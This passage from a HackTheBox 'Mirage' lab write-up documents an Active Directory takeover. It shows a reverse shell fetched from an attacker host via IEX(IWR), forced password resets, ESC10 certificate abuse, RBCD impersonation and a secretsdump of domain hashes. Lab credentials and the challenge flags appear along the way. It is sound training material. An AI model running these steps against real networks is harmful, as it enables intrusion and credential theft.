NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MIRAGE\Exchange_Admins                      Group            S-1-5-21-2127163471-3824721834-2568365109-2601 Mandatory group, Enabled by default, Enabled group
MIRAGE\IT_Admins                            Group            S-1-5-21-2127163471-3824721834-2568365109-1106 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### User.txt

```bash
*Evil-WinRM* PS C:\Users\nathan.aadam> cat Desktop/user.txt
d8edff802dd5d8368c6029263e1b8f47
```

## Lateral Movement (mark.bbond)

Check the configuration for NATS
```bash
*Evil-WinRM* PS C:\Program Files\Nats-Server> cat nats-server.conf
listen: '0.0.0.0:4222'

jetstream: {
  store_dir: 'C:\Program Files\Nats-Server\tmp'
}

accounts: {
  '$SYS': {
    users: [
      { user: 'sysadmin', password: 'bb5M0k5XWIGD' }
    ]
  },

  'dev': {
    jetstream: true,
    users: [
      { user: 'Dev_Account_A', password: 'hx5h7F5554fP@1337!' },
      { user: 'Dev_Account_B', password: 'tvPFGAzdsJfHzbRJ' }
    ]
  }
}
```

Not very useful..

Upload winpeas and enumerate
```bash
*Evil-WinRM* PS C:\Users\nathan.aadam\Music> curl.exe 10.10.14.37/wp.exe -O
*Evil-WinRM* PS C:\Users\nathan.aadam\Music> .\wp.exe | tee -filepath wp.log
```

### AutoLogon Credentials

Right... evil-winrm + faketime is absolute dogshit, better to get reverse shell for stability
```bash
‚îî‚îÄ$ cp /opt/scripts/shells/ConPtyShell/Invoke-ConPtyShell.ps1 .
‚îî‚îÄ$ echo 'Invoke-ConPtyShell 10.10.14.37 4444' >> Invoke-ConPtyShell.ps1
‚îî‚îÄ$ stty raw -echo; (stty size; cat) | nc -lvnp 4444
---
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> IEX(IWR http://10.10.14.37/Invoke-ConPtyShell.ps1 -UseBasicParsing)
---
PS C:\Users\nathan.aadam\Music> .\wp.exe | tee -filepath wp.log
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Display information about local users
   Computer Name           :   DC01
   User Name               :   svc_mirage
   User Id                 :   2604
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Old service account migrated by contractors
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   5/22/2025 1:37:45 PM

   =================================================================================================
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  MIRAGE
    DefaultUserName               :  mark.bbond
    DefaultPassword               :  1day@atime
```

## Lateral Movement (javier.mmarshall)

### ForceChangePassword

![Writeup-6.png](/assets/pentest/htb/mirage/Writeup-6.png)

[https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)

```bash
‚îî‚îÄ$ faketime -f +7h bloodyAD -u 'mark.bbond' -p '1day@atime' -d 'mirage.htb' --host 'dc01.mirage.htb' --dc-ip 10.10.11.78 -k set password javier.mmarshall 'Password123$'
[+] Password changed successfully!
```

## Lateral Movement (`MIRAGE-SERVICE$`)

![Writeup-7.png](/assets/pentest/htb/mirage/Writeup-7.png)

### Disabled Account

#### ACCOUNTDISABLE

```bash
‚îî‚îÄ$ faketime -f +7h netexec ldap dc01.mirage.htb -u 'javier.mmarshall' -p 'Password123$' -k --gmsa
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc01.mirage.htb 389    DC01             [-] mirage.htb\javier.mmarshall:Password123$ KDC_ERR_CLIENT_REVOKED

‚îî‚îÄ$ faketime -f +7h bloodyAD -u 'mark.bbond' -p '1day@atime' -d 'mirage.htb' --host 'dc01.mirage.htb' --dc-ip 10.10.11.78 -k get object javier.mmarshall --attr userAccountControl

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

User account is disabled; Enable it [Use the UserAccountControl flags to manipulate user account properties](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)

For some reason `bloodyAD` kept failing to set property 
```bash
‚îî‚îÄ$ faketime -f +7h bloodyAD -u 'mark.bbond' -p '1day@atime' -d 'mirage.htb' --host 'dc01.mirage.htb' --dc-ip 10.10.11.78 -k set object javier.mmarshall userAccountControl -v 512
[+] javier.mmarshall's userAccountControl has been updated
```

Still getting error, however the account is not disabled anymore..
```bash
‚îî‚îÄ$ faketime -f +7h netexec ldap dc01.mirage.htb -u 'javier.mmarshall' -p 'Password123$' -k --gmsa
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc01.mirage.htb 389    DC01             [-] mirage.htb\javier.mmarshall:Password123$ KDC_ERR_CLIENT_REVOKED

‚îî‚îÄ$ faketime -f +7h bloodyAD -u 'mark.bbond' -p '1day@atime' -d 'mirage.htb' --host 'dc01.mirage.htb' --dc-ip 10.10.11.78 -k get object javier.mmarshall --attr userAccountControl

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: NORMAL_ACCOUNT
```

#### LogonHours

If we compare attributes we can see that **javier** has `OU=Disabled`, in UAC doesn't have **DONT_EXPIRE_PASSWORD** and `logonHours`is empty instead of... slashes?

![Writeup-8.png](/assets/pentest/htb/mirage/Writeup-8.png)

[differences between taking away a user's logon hours vs disabling the account](https://www.reddit.com/r/windows/comments/lfjnzg/differences_between_taking_away_a_users_logon/): *Disabling the account stops everything domain wide, while logon hours only affects the local machine. If they have features like Exchange email on their phone, disabling the account will kill that too.*

- [Logon-Hours attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-logonhours): The hours that the user is allowed to logon to the domain.
- [How to set Logon Hours for Active Directory Users](https://activedirectorypro.com/how-to-set-logon-hours-for-active-directory-users/)

If we inspect Logon Hours for Nathan it's fully 255 values, meaning they can login any time.
```bash
PS C:\Users\nathan.aadam\Music> (Get-ADUser -Identity nathan.aadam -Properties logonHours).logonHours
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
```

```powershell
PS C:\Users\nathan.aadam\Music> $logonHours = (Get-ADUser -Identity nathan.aadam -Properties logonHours).logonHours
PS C:\Users\nathan.aadam\Music> $cred = New-Object System.Management.Automation.PSCredential('mirage\mark.bbond', (ConvertTo-SecureString '1day@atime' -AsPlainText -Force))
PS C:\Users\nathan.aadam\Music> Set-ADUser  -Identity javier.mmarshall -Credential $cred -Replace @{LogonHours = $logonHours}
PS C:\Users\nathan.aadam\Music> (Get-ADUser -Identity javier.mmarshall -Properties logonHours).logonHours
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
255
```

```bash
‚îî‚îÄ$ faketime -f +7h netexec ldap dc01.mirage.htb -u 'javier.mmarshall' -p 'Password123$' -k --gmsa
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\javier.mmarshall:Password123$
LDAP        dc01.mirage.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.mirage.htb 389    DC01             Account: Mirage-Service$      NTLM: 305806d84f7c1be93a07aaf40f0c7866     PrincipalsAllowedToReadPassword: javier.mmarshall
```

## Lateral Movement (DC01$)

No direct path to other users

![Writeup-9.png](/assets/pentest/htb/mirage/Writeup-9.png)

The reason why we could change logonHours attribute on Javier was because we had a WRITE permission over the object. 
```bash
‚îî‚îÄ$ faketime -f +7h bloodyAD -u 'mark.bbond' -p '1day@atime' -d 'mirage.htb' --host 'dc01.mirage.htb' --dc-ip 10.10.11.78 -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
permission: WRITE

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
permission: WRITE

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
permission: WRITE
```

Enumerate write permissions for the machine account:
```bash
‚îî‚îÄ$ faketime -f +7h netexec smb dc01.mirage.htb -u 'Mirage-Service$' -H '305806d84f7c1be93a07aaf40f0c7866' -k --generate-tgt mirage_service

‚îî‚îÄ$ export KRB5CCNAME=mirage_service.ccache

‚îî‚îÄ$ faketime -f +7h bloodyAD -u 'Mirage-Service$' -d 'mirage.htb' --host 'dc01.mirage.htb' --dc-ip 10.10.11.78 -k get writable

distinguishedName: CN=TPM Devices,DC=mirage,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=mirage,DC=htb
permission: WRITE

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
permission: WRITE

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
permission: WRITE
```

Nothing too interesting; We already own Mark, but WRITE permission could be useful (?)

ADCS server is available, but no vulnerable templates found via `certipy-ad`
```bash
‚îî‚îÄ$ faketime -f +7h certipy-ad find -u 'Mirage-Service$@mirage.htb' -k -no-pass -target dc01.mirage.htb -vulnerable -stdout -text
Certipy v5.0.2 - by Oliver Lyak (ly4k)
Certificate Authorities
  0
    CA Name                             : mirage-DC01-CA
    DNS Name                            : dc01.mirage.htb
    Certificate Subject                 : CN=mirage-DC01-CA, DC=mirage, DC=htb
    Certificate Serial Number           : 1512EEC0308E13A146A0B5AD6AA741C9
    Certificate Validity Start          : 2025-07-04 19:58:25+00:00
    Certificate Validity End            : 2125-07-04 20:08:25+00:00
    Web Enrollment
      HTTP  Enabled                     : False
      HTTPS Enabled                     : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MIRAGE.HTB\Administrators
      Access Rights
        ManageCa                        : MIRAGE.HTB\Administrators, MIRAGE.HTB\Domain Admins, MIRAGE.HTB\Enterprise Admins
        ManageCertificates              : MIRAGE.HTB\Administrators, MIRAGE.HTB\Domain Admins, MIRAGE.HTB\Enterprise Admins
        Enroll                          : MIRAGE.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

### ESC10

After some research later and Discord hints then attack vector seems to be **ESC10**; I was a bit hesitant about this, because for **ESC10** to be viable following registry must be 0:
```powershell
PS C:\Users\nathan.aadam\Music\ADRecon-Report-20250728104326\CSV-Files> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
    StrongCertificateBindingEnforcement    REG_DWORD    0x1

PS C:\Users\nathan.aadam\Music\ADRecon-Report-20250728104326\CSV-Files> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name StrongCertificateBindingEnforcement

StrongCertificateBindingEnforcement : 1
PSPath                              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
PSParentPath                        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
PSChildName                         : Kdc
PSDrive                             : HKLM
PSProvider                          : Microsoft.PowerShell.Core\Registry
```

**ESC9** was more suited vector ü§î

However there's Case 2 where `CertificateMappingMethods`¬†is set to¬†`0x4`, meaning no strong mapping is performed and only the UPN will be checked.  
- [https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc10-weak-certificate-mapping](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc10-weak-certificate-mapping)
- [https://github.com/ly4k/Certipy/wiki/06-‚Äê-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication](https://github.com/ly4k/Certipy/wiki/06-‚Äê-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication)
- [https://hideandsec.sh/link/66#bkmrk-esc10---case-2-0](https://hideandsec.sh/link/66#bkmrk-esc10---case-2-0)

Since the value is 4 the attack is valid.
```bash
PS C:\Users\nathan.aadam\Music\ADRecon-Report-20250728104326\CSV-Files> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v "CertificateMappingMethods" | sls CertificateMappingMethods
    CertificateMappingMethods    REG_DWORD    0x4

PS C:\Users\nathan.aadam\Music\ADRecon-Report-20250728104326\CSV-Files> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" -Name CertificateMappingMethods | Select CertificateMappingMethods | fl

CertificateMappingMethods : 4
```

```bash
# [Optional] Remember the UPN
‚îî‚îÄ$ faketime -f +7h certipy-ad account -u 'Mirage-Service$@mirage.htb' -k -no-pass -target 'dc01.mirage.htb' -user 'mark.bbond' read | grep userPrincipalName
Certipy v5.0.2 - by Oliver Lyak (ly4k)
    userPrincipalName                   : mark.bbond@mirage.htb

# Update UPN to DC01$ (DC Machine) UPN
‚îî‚îÄ$ faketime -f +7h certipy-ad account -u 'Mirage-Service$@mirage.htb' -k -no-pass -target 'dc01.mirage.htb' -upn 'dc01$@mirage.htb' -user 'mark.bbond' update
[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'

# Get certificate via Kerberos ticket
## Note: For some reason if you try without ccache file it fails, with `-p "password" -k`
‚îî‚îÄ$ faketime -f +7h netexec smb dc01.mirage.htb -u 'mark.bbond' -p '1day@atime' -k --generate-tgt mark
‚îî‚îÄ$ export KRB5CCNAME=mark.ccache
‚îî‚îÄ$ faketime -f +7h certipy-ad req  -u 'mark.bbond@mirage.htb' -k -no-pass -target 'dc01.mirage.htb' -ca 'mirage-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 20
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'

# Revert UPN to original
‚îî‚îÄ$ export KRB5CCNAME=./tickets/mirage_service.ccache
‚îî‚îÄ$ faketime -f +7h certipy-ad account -u 'Mirage-Service$@mirage.htb' -k -no-pass -target 'dc01.mirage.htb' -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' update
[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'

‚îî‚îÄ$ faketime -f +7h certipy-ad auth -pfx 'dc01.pfx' -dc-ip '10.10.11.78' -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# whoami
u:MIRAGE\DC01$
```

The attack was successful and we have LDAP Shell as `DC01$`

In LDAP shell we don't have enough privileges to add users, add users to groups, change passwords, grant control and things like this.

### (RBCD) Resource-based constrained

But we can attack RBCD, [(RBCD) Resource-based constrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
```bash
# set_rbcd DC01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on DC01$ via S4U2Proxy
```

Impersonate
```bash
‚îî‚îÄ$ faketime -f +7h netexec smb dc01.mirage.htb -u 'Mirage-Service$' -H '305806d84f7c1be93a07aaf40f0c7866' -k --generate-tgt mirage_service
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\Mirage-Service$:305806d84f7c1be93a07aaf40f0c7866
SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: mirage_service.ccache
SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=mirage_service.ccache

‚îî‚îÄ$ export KRB5CCNAME=mirage_service.ccache

‚îî‚îÄ$ faketime -f +7h impacket-getST -spn 'cifs/dc01.mirage.htb' -impersonate 'DC01$' -dc-ip '10.10.11.78' 'mirage.htb/Mirage-Service$' -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache

‚îî‚îÄ$ export KRB5CCNAME=DC01\$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache

‚îî‚îÄ$ faketime -f +7h impacket-secretsdump -dc-ip '10.10.11.78' 'mirage.htb'/'DC01$'@'dc01.mirage.htb' -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
[*] Cleaning up...
```

## Privilege Escalation (Administrator)

```bash
‚îî‚îÄ$ faketime -f +7h netexec smb dc01.mirage.htb -u 'Administrator' -H '7be6d4f3c2b9c0e3560f5a29eeb1afb3' -k --generate-tgt admin
‚îî‚îÄ$ export KRB5CCNAME=admin.ccache
‚îî‚îÄ$ faketime -f +7h evil-winrm -i dc01.mirage.htb -r mirage.htb
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
mirage\administrator
```

### Root.txt

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type \Users\Administrator\Desktop\root.txt
06f94ff141562ad04510a33900af151a
```